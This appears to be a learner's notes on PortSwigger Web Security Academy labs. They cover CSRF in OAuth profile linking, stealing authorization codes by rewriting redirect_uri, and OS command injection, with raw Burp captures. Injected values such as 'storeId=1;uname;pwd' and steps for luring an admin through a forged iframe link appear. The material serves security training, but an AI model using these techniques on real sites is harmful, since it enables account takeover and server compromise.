Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net/interaction/tCE7b8cM10JUhHU5UOG0M
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i





Response:
HTTP/2 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Set-Cookie: _interaction=tCE7b8cM10JUhHU5UOG0M; path=/interaction/tCE7b8cM10JUhHU5UOG0M; expires=Tue, 27 Feb 2024 01:03:59 GMT; samesite=lax; secure; httponly
Set-Cookie: _interaction_resume=tCE7b8cM10JUhHU5UOG0M; path=/auth/tCE7b8cM10JUhHU5UOG0M; expires=Tue, 27 Feb 2024 01:03:59 GMT; samesite=lax; secure; httponly
Set-Cookie: _session=oltyGiUqxiyg6MaifDfY8; path=/; expires=Tue, 12 Mar 2024 00:53:59 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=oltyGiUqxiyg6MaifDfY8; path=/; expires=Tue, 12 Mar 2024 00:53:59 GMT; secure; httponly
Location: /interaction/tCE7b8cM10JUhHU5UOG0M
Content-Type: text/html; charset=utf-8
Date: Tue, 27 Feb 2024 00:53:59 GMT
Keep-Alive: timeout=5
Content-Length: 99

Redirecting to <a href="/interaction/tCE7b8cM10JUhHU5UOG0M">/interaction/tCE7b8cM10JUhHU5UOG0M</a>.

Similarly we can find multiple /auth requests and then we can see /oauth-linking 

iv) Next we can see /oauth-linking request

411	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	GET	/auth/tCE7b8cM10JUhHU5UOG0M	false	false	302	1023	HTML				true	79.125.84.16	_interaction_resume=; _session=RyAFaES85v_EPtrY6caVp; _session.legacy=RyAFaES85v_EPtrY6caVp	1708995319932	8080


Request:
GET /oauth-linking?code=zL7NEBImWoxoIm-S-_5bKRd8OlTPQtB4ETd-JbZm4PO HTTP/2
Host: 0a420000042409a7856f1c3d009700f8.web-security-academy.net
Cookie: session=8CMBb8YRSF6ZTulL8TTJeAUzyujaATpG
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i

-> In the request we can see a certain code or token that was being sent :code=zL7NEBImWoxoIm-S-_5bKRd8OlTPQtB4ETd-JbZm4PO
-> This is the token which we obtained because of previous auth request:
411	https://oauth-0afd0029046809f985e51ad2024400c6.oauth-server.net	GET	/auth/tCE7b8cM10JUhHU5UOG0M	false	false	302	1023	HTML				true	79.125.84.16	_interaction_resume=; _session=RyAFaES85v_EPtrY6caVp; _session.legacy=RyAFaES85v_EPtrY6caVp	1708995319932	8080
-> This auth request gives us a response with code: Location: https://0a420000042409a7856f1c3d009700f8.web-security-academy.net/oauth-linking?code=zL7NEBImWoxoIm-S-_5bKRd8OlTPQtB4ETd-JbZm4PO
-> This code is used in /oauth-linking request and below is the response of /oauth-linking request 


Response:
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2892

<!DOCTYPE html>
									<html>
										<head>
											<link href=resources/labheader/css/academyLabHeader.css rel=stylesheet>
											<link href=resources/css/labs.css rel=stylesheet>
											<title>Forced OAuth profile linking</title>
										</head>
										<body>
											<script src="/resources/labheader/js/labHeader.js"/>
											<div id="academyLabHeader">
												<section class='academyLabBanner'>
													<div class=container>
													<div class=logo></div>
													<div class=title-container>
													<h2>Forced OAuth profile linking</h2>
													<a id='lab-link' class='button' href='/'>Back to lab home</a>
													<a id='exploit-link' class='button' target='_blank' href='https://exploit-0a640082042c097185181b6c016a007e.exploit-server.net'>Go to exploit server</a>
													<a class=link-back href='https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
														<g>
															<polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'/>
															<polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'/>
														</g>
													</svg>
												</a>
											</div>
											<div class='widgetcontainer-lab-status is-notsolved'>
												<span>LAB</span>
												<p>Not solved</p>
												<span class=lab-status-icon></span>
											</div>
										</div>
									</div>
								</section>
							</div>
							<div theme="">
								<section class="maincontainer">
									<div class="container is-page">
										<header class="navigation-header">
											<section class="top-links">
												<a href=/>Home</a>
											<p>|</p>
											<a href="/my-account?id=wiener">My account</a>
											<p>|</p>
										</section>
									</header>
									<header class="notification-header">
                    </header>
									<p>You have successfully linked your social media account</p>
									<a class=button href='/my-account'>Continue</a>
								</div>
							</section>
							<div class="footer-wrapper">
            </div>
						</div>
					</body>
				</html>

8v) Now if we get somebody like admin , if we send them the request and they submitted 
themselves if the request is accepted by server, this will help us log as admin 
-> This is because we dont see the state being sent in request 


28) BAC:6 OAUTH2.0 Vulnerabilities - Exploiting a Login OAUTH 2.0 Flow Through CSRF
-> This is similar to the previous less where we have a CSRF vulnerability within oauth vulnerability
-> Though similar to the previous less, this has a small twist to it 

######Requests#########
456	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	POST	/interaction/pZ6JdnWF6D2-da5uXP0r4/login	true	false	302	367					true	34.246.129.62		1709002656087	8080
457	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	GET	/auth/pZ6JdnWF6D2-da5uXP0r4	false	false	302	1011	HTML				true	34.246.129.62	_interaction=pZ6JdnWF6D2-da5uXP0r4; _interaction_resume=pZ6JdnWF6D2-da5uXP0r4; _session=rq2LlADFmp-FF3xcovvH4; _session.legacy=rq2LlADFmp-FF3xcovvH4	1709002657538	8080
458	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	GET	/interaction/pZ6JdnWF6D2-da5uXP0r4	false	false	200	4917	HTML		Sign-in		true	34.246.129.62		1709002659004	8080
460	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/resources/images/blog.svg	false	false	200	7625	XML	svg			true	79.125.84.16		1709002660818	8080
461	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	POST	/interaction/pZ6JdnWF6D2-da5uXP0r4/confirm	false	false	302	367					true	34.246.129.62		1709002684365	8080
462	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	GET	/auth/pZ6JdnWF6D2-da5uXP0r4	false	false	302	1116	HTML				true	34.246.129.62	_interaction_resume=; _session=2ssFHx3WnpA-gbWRNMtni; _session.legacy=2ssFHx3WnpA-gbWRNMtni	1709002685821	8080
463	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/oauth-callback?code=PtCAEyRn9ROLZ6zhCCGUuCkFMKbRRs0yVvjCdOrKhLl	true	false	200	3241	HTML		OAuth account hijacking via redirect_uri		true	79.125.84.16	session=29jreym6IxQZjdWWIISeVwsVKG0d6GKo	1709002687269	8080
466	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/resources/labheader/js/labHeader.js	false	false	200	1799	script	js			true	79.125.84.16		1709002688781	8080
467	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/resources/labheader/images/logoAcademy.svg	false	false	200	8978	XML	svg			true	79.125.84.16		1709002690305	8080
468	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/resources/labheader/images/ps-lab-notsolved.svg	false	false	200	1068	XML	svg			true	79.125.84.16		1709002690306	8080
469	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/academyLabHeader	false	false	101	253					true	79.125.84.16		1709002690661	8080
470	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/	false	false	200	8650	HTML		OAuth account hijacking via redirect_uri		true	79.125.84.16		1709002744629	8080
472	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/resources/images/blog.svg	false	false	200	7625	XML	svg			true	79.125.84.16		1709002746088	8080
479	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/academyLabHeader	false	false	101	253					true	79.125.84.16		1709002747603	8080
484	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/my-account?id=wiener	true	false	200	3268	HTML		OAuth account hijacking via redirect_uri		true	79.125.84.16		1709002760072	8080
485	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/academyLabHeader	false	false	101	253					true	79.125.84.16		1709002761878	8080
#######################

a) Using target lab we are logging inside using wiener/peter 
b) After logging in - lets analyse requests of the authentication flow 
c) First request is the post request:to logn 

456	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	POST	/interaction/pZ6JdnWF6D2-da5uXP0r4/login	true	false	302	367					true	34.246.129.62		1709002656087	8080

Request:
POST /interaction/pZ6JdnWF6D2-da5uXP0r4/login HTTP/1.1
Host: oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net
Cookie: _interaction=pZ6JdnWF6D2-da5uXP0r4
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net/interaction/pZ6JdnWF6D2-da5uXP0r4
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: close

username=wiener&password=peter

Response: 
HTTP/1.1 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net/auth/pZ6JdnWF6D2-da5uXP0r4
Date: Tue, 27 Feb 2024 02:57:37 GMT
Keep-Alive: timeout=15
Content-Length: 0
Via: 1.1 hk1-proxy02.corp.expeditors.com:80 (Cisco-WSA/11.8.1-023)
Connection: close


d) Next we have a request /auth: followed by interactions
457	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	GET	/auth/pZ6JdnWF6D2-da5uXP0r4	false	false	302	1011	HTML				true	34.246.129.62	_interaction=pZ6JdnWF6D2-da5uXP0r4; _interaction_resume=pZ6JdnWF6D2-da5uXP0r4; _session=rq2LlADFmp-FF3xcovvH4; _session.legacy=rq2LlADFmp-FF3xcovvH4	1709002657538	8080
458	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	GET	/interaction/pZ6JdnWF6D2-da5uXP0r4	false	false	200	4917	HTML		Sign-in		true	34.246.129.62		1709002659004	8080
460	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/resources/images/blog.svg	false	false	200	7625	XML	svg			true	79.125.84.16		1709002660818	8080
461	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	POST	/interaction/pZ6JdnWF6D2-da5uXP0r4/confirm	false	false	302	367					true	34.246.129.62		1709002684365	8080


e) Then most interesting part in this authentication flow and call back  is :
After call back we are able to see only the javascript and image requests which means the authentication is over 

:
462	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	GET	/auth/pZ6JdnWF6D2-da5uXP0r4	false	false	302	1116	HTML				true	34.246.129.62	_interaction_resume=; _session=2ssFHx3WnpA-gbWRNMtni; _session.legacy=2ssFHx3WnpA-gbWRNMtni	1709002685821	8080

-> If we check the response of below request, we are able to see that we have a html response saying that " you have successfully logged in 
463	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/oauth-callback?code=PtCAEyRn9ROLZ6zhCCGUuCkFMKbRRs0yVvjCdOrKhLl	true	false	200	3241	HTML		OAuth account hijacking via redirect_uri		true	79.125.84.16	session=29jreym6IxQZjdWWIISeVwsVKG0d6GKo	1709002687269	8080


f) Next we are going to logout and try to login again with my social media acccount because that is a different flow than the initial login 
g) In initial login , our social media account got linked with blog. Now we are going to login. so a different flow is going to happen 
-> lets check if this flow has something vulnerable 
-> Lets delete everything in Http History 
h) In UI go to My Account and you can see that is has automatically logged me into my social media account - this is because my profile is already linked to social 
media website and 

i) Now in HTTP history we will see only data exchanged during login flow and it wont contain data exchanged during initial linking flow 

###HTTP history exchange during login flow#########489	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/my-account	false	false	302	219					true	34.246.129.62		1709003776876	8080
490	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/social-login	false	false	200	3387	HTML		OAuth account hijacking via redirect_uri		true	34.246.129.62		1709003778340	8080
492	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/academyLabHeader	false	false	101	253					true	34.246.129.62		1709003781633	8080
493	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	GET	/auth?client_id=zncrd9imys8y00y55dbia&redirect_uri=https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email	true	false	302	977	HTML				true	34.246.129.62	_session=2ssFHx3WnpA-gbWRNMtni; _session.legacy=2ssFHx3WnpA-gbWRNMtni	1709003784642	8080
494	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/oauth-callback?code=gdvHlsxDjdPsQN7j7pe7Ko1Xr2ROp6-Xk-fqEb9Z6XF	true	false	200	3241	HTML		OAuth account hijacking via redirect_uri		true	34.246.129.62	session=GZCEZnzpSiq3UBlpB0VAYTKNmhSyKiF2	1709003786489	8080
495	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/academyLabHeader	false	false	101	253					true	34.246.129.62		1709003788047	8080
496	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/	false	false	200	8650	HTML		OAuth account hijacking via redirect_uri		true	34.246.129.62		1709003792053	8080
497	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/academyLabHeader	false	false	101	253					true	34.246.129.62		1709003793866	8080
498	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/my-account?id=wiener	true	false	200	3268	HTML		OAuth account hijacking via redirect_uri		true	79.125.84.16		1709003806230	8080
499	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/academyLabHeader	false	false	101	253					true	79.125.84.16		1709003808209	8080
########

j) First request is to /my-account and then to /social-login 
k) Interesting request in this flow is the /auth?clid_id=

493	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	GET	/auth?client_id=zncrd9imys8y00y55dbia&redirect_uri=https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email	true	false	302	977	HTML				true	34.246.129.62	_session=2ssFHx3WnpA-gbWRNMtni; _session.legacy=2ssFHx3WnpA-gbWRNMtni	1709003784642	8080

Request: GET /auth?client_id=zncrd9imys8y00y55dbia&redirect_uri=https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net
Cookie: _session=2ssFHx3WnpA-gbWRNMtni; _session.legacy=2ssFHx3WnpA-gbWRNMtni
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: close



Response: 
HTTP/1.1 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback?code=gdvHlsxDjdPsQN7j7pe7Ko1Xr2ROp6-Xk-fqEb9Z6XF
Set-Cookie: _session=2ssFHx3WnpA-gbWRNMtni; path=/; expires=Tue, 12 Mar 2024 03:16:26 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=2ssFHx3WnpA-gbWRNMtni; path=/; expires=Tue, 12 Mar 2024 03:16:26 GMT; secure; httponly
Date: Tue, 27 Feb 2024 03:16:26 GMT
Keep-Alive: timeout=15
Content-Length: 289
Content-Type: text/html; charset=utf-8
Via: 1.1 hk1-proxy02.corp.expeditors.com:80 (Cisco-WSA/11.8.1-023)
Connection: close
Redirecting to <a href="https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback?code=gdvHlsxDjdPsQN7j7pe7Ko1Xr2ROp6-Xk-fqEb9Z6XF">https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback?code=gdvHlsxDjdPsQN7j7pe7Ko1Xr2ROp6-Xk-fqEb9Z6XF</a>.



-Here in the request we pass the client_id and we pass the redirect_uri 
-> name suggests that there is a uri  that user should be redirected to 
-> Here redirect uri is a path on current website 
-> If the url is redirected to this website, then it suggests that the next request should be sent there 

eg:
GET /auth?client_id=zncrd9imys8y00y55dbia&redirect_uri=https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/1.1

l) Thus in the next request in http history we can see that is the url that is specified in the redirect_uri 

494	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/oauth-callback?code=gdvHlsxDjdPsQN7j7pe7Ko1Xr2ROp6-Xk-fqEb9Z6XF	true	false	200	3241	HTML		OAuth account hijacking via redirect_uri		true	34.246.129.62	session=GZCEZnzpSiq3UBlpB0VAYTKNmhSyKiF2	1709003786489	8080

-> So we can see that next request has a code passed with it. The code or the access token comes from the previous request's response: /auth?clientid  

where the redirect uri and access token is specified 

eg:/auth?clientid response
HTTP/1.1 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback?code=gdvHlsxDjdPsQN7j7pe7Ko1Xr2ROp6-Xk-fqEb9Z6XF
Set-Cookie: _session=2ssFHx3WnpA-gbWRNMtni; path=/; expires=Tue, 12 Mar 2024 03:16:26 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=2ssFHx3WnpA-gbWRNMtni; path=/; expires=Tue, 12 Mar 2024 03:16:26 GMT; secure; httponly
Date: Tue, 27 Feb 2024 03:16:26 GMT
Keep-Alive: timeout=15
Content-Length: 289
Content-Type: text/html; charset=utf-8
Via: 1.1 hk1-proxy02.corp.expeditors.com:80 (Cisco-WSA/11.8.1-023)
Connection: close

Redirecting to <a href="https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback?code=gdvHlsxDjdPsQN7j7pe7Ko1Xr2ROp6-Xk-fqEb9Z6XF">https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback?code=gdvHlsxDjdPsQN7j7pe7Ko1Xr2ROp6-Xk-fqEb9Z6XF</a>.

m) The crucial part is : if we can modify or hijack the redirect uri , hacker can get the access token, then hacker can use the access-token to login into 
targetwebsite  as user 

n) Now there is a csrf element to this: because we need an admin to submit the forged request that we are going to create here 
-> We need to send a forged request to the admin with forrged return url --> then admin will login to the social site -> because of the forged url in redirect uri, access 
token is not going to be sent to target website , instead it gets sent to the hacker's server 
-> Once the hacker receives the token , he will use the access token to get logged in as user in Target website 


o) How to create forged request?
-> It is easy because we already have the request in /auth?client_id request 

eg:
493	https://oauth-0a200076044c358a81ad2dbc02e9009d.oauth-server.net	GET	/auth?client_id=zncrd9imys8y00y55dbia&redirect_uri=https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email	true	false	302	977	HTML				true	34.246.129.62	_session=2ssFHx3WnpA-gbWRNMtni; _session.legacy=2ssFHx3WnpA-gbWRNMtni	1709003784642	8080

-> All we have to do is to modify the redirect_uri to hackers server 


---> for social engineering scenario, we can copy the link and add into iframe and mention url as source and make the user click it, so that user can click it  


p) Now for the final step of accessing the target site using the access token, in burpsuite http history we can see how the request was sent to 
target. In our case it sent like this:

494	https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net	GET	/oauth-callback?code=gdvHlsxDjdPsQN7j7pe7Ko1Xr2ROp6-Xk-fqEb9Z6XF	true	false	200	3241	HTML		OAuth account hijacking via redirect_uri		true	34.246.129.62	session=GZCEZnzpSiq3UBlpB0VAYTKNmhSyKiF2	1709003786489	8080

-> So we will use the same request to login with access token 

q) Now we will copy the url from http history 

https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback?code=gdvHlsxDjdPsQN7j7pe7Ko1Xr2ROp6-Xk-fqEb9Z6XF

-> update it with correct access token
-> Goto target website , logout the site and paste the url in the browser 


https://0acc002b04c935b0814d2f8b006300e3.web-security-academy.net/oauth-callback?code=gdvHlsxDjdPsQN7j7pe7Ko1Xr2ROp6-Xk-fqEb9Z6XF

--> If everything is correct, we will be able to login as admin into the website  since we have specified the admin access token for the code 


29) Injection Vulnerabilities Introduction 
OS Command Injection 
XSS 
SQL Injections 

-> 3rd most common in all of the tested websites according to OWASP 


30) Injection Vulnerabilities 1 - OS Command Injection - Discovering Basic Command Injection Vulnerability
a) What is OS Command Injection 
i) Executing system commands on the target web server or computer 
ii) Compromises application and server 
iii) Compromises network and other resources 


Target website: https://portswigger.net/web-security/os-command-injection/lab-simple

b) In target lab, we know vulnerability is present in Product details page , we can select location and click on check stock 
-> IT will show that it has 73 units of that particular stock 

c) Usual steps in BBH
Step i) Usually our next step in BBH is to turn on interceptor in proxy and send the request to see all of the data that is being sent. 
Step ii) Analyze the data and see if we can modify the user data to manipulate execution of this application 
Step iii) In inspector section of interceptor we will be able to see Request body parameters : productId and storeId 
-> Request headers can be modified in Inspector section-> Request headers or in Raw-> directly change it 
Step iv) Everything after equal sign for Request boday parameters should be tested for all vulnerabilities  
-> This step involves lot of tests and lot of trial and error
Step V) Instead of using interceptor and modifying parameters, we can use the repeater and modify requests 


d) Here we have a normal request which gets the count of the items

Request: 

POST /product/stock HTTP/2
Host: 0a8d00a50497e6218382419600be00b0.web-security-academy.net
Cookie: session=tr0IpmixMskKslU7ajeGBHbEAy7iv9q2
Content-Length: 21
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a8d00a50497e6218382419600be00b0.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8d00a50497e6218382419600be00b0.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

productId=2&storeId=1



Response:
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3

32

-> Here we get 32 in the number of items for response 

e) As usual we will manipulate the values after the equal sign  and tell all the vulnerabilities that we  know

eg: productId=2&storeId=1

f) In order to test command injection vulnerabilities, pass the uname command of linux os along with product id 
-> in order to do that, append the productId with semicolon (;) and add the uname command 
-> semi colon in terminal is used to concatenate commands or join commands 
-> There are a number of special characters which can be used in terminal in order to use multiple commands in same line 

eg:
[mahesh@GS1-MAHESWAR-LX ~]$ uname;pwd
Linux
/home/mahesh

g) Lets try appending with product id:

eg: Request 
POST /product/stock HTTP/2
Host: 0a8d00a50497e6218382419600be00b0.web-security-academy.net
Cookie: session=tr0IpmixMskKslU7ajeGBHbEAy7iv9q2
Content-Length: 27
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a8d00a50497e6218382419600be00b0.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8d00a50497e6218382419600be00b0.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

productId=2;uname&storeId=1


Response:
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 0

-> We dont get the execution restult for uname in the response 

h) Let try appending with storeId to see if we get any response for uname 

eg:Request
POST /product/stock HTTP/2
Host: 0a8d00a50497e6218382419600be00b0.web-security-academy.net
Cookie: session=tr0IpmixMskKslU7ajeGBHbEAy7iv9q2
Content-Length: 27
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a8d00a50497e6218382419600be00b0.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8d00a50497e6218382419600be00b0.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

productId=2&storeId=1;uname

Response:
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9

32
Linux

-> We get os name: linux in the output 

eg: Request 2:

POST /product/stock HTTP/2
Host: 0a8d00a50497e6218382419600be00b0.web-security-academy.net
Cookie: session=tr0IpmixMskKslU7ajeGBHbEAy7iv9q2
Content-Length: 31
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a8d00a50497e6218382419600be00b0.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8d00a50497e6218382419600be00b0.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

productId=2&storeId=1;uname;pwd


Response:
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 28

32
Linux
/home/peter-aaf5PH


-> We get os name linux as well as pwd output in the response 


31) Injection Vulnerabilities 1 - OS Command Injection - Discovering Blind Command Injection Vulnerabilities

a) blind or s command injection vulnerabilities 
-> In previous lecture we are able to inject a system command in request and see the result of command execution in the response 
-> In Many cases, target application may be vulnerable to an os command execution, but web application is not 
going to show you the result of the command execution 
-> Hence the name blind or s command execution and therefore making it harder to discover or spot  

Target website: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays


b) In that scenario, we can execute a command that can make the target system to pause or sleeep for few seconds 
and then monitor the time taken for the response 
-> In target lab, we know the issue is in submit-feedback feature, which has a number of input boxes 
-> Enter feedback details,  turn interceptor and submit the feedback 

 Request:
POST /feedback/submit HTTP/2
Host: 0a5d006904516cba8379b42900bf003d.web-security-academy.net
Cookie: session=DHqOHe3BQ0ByTXFtMztCnotfHfnaXZek
Content-Length: 132
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
